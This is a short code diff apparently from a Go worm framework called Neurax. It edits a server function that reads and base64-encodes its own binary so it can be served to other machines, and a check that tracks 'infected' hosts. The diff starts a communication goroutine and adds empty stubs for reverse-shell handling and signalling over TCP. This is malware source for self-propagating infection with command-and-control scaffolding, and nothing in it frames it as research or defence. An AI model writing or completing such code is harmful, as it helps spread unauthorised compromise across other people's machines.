@@ -129,6 +129,7 @@ func NeuraxServer() {
 	/*if NeuraxConfig.prevent_reinfect {
 		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
 	}*/
+	go handle_comm()
 	data, _ := ioutil.ReadFile(os.Args[0])
 	if NeuraxConfig.base64 {
 		data = []byte(coldfire.B64E(string(data)))
@@ -170,9 +171,23 @@ func IsHostInfected(target string) bool {
 	}
 	if rsp.StatusCode == 200 {
 		infected_hosts = append(infected_hosts, target)
+		infected_hosts = coldfire.RemoveFromSlice(infected_hosts, coldfire.GetLocalIp())
 		return true
 	}
 	return false
+}
+
+func handle_comm() {
+
+}
+
+func handle_revshell_conn() {
+
+}
+
+//coldfire.SendDataTCP
+func NeuraxSignal(host string, port int) {
+
 }
 
 func NeuraxScan(c chan string) {
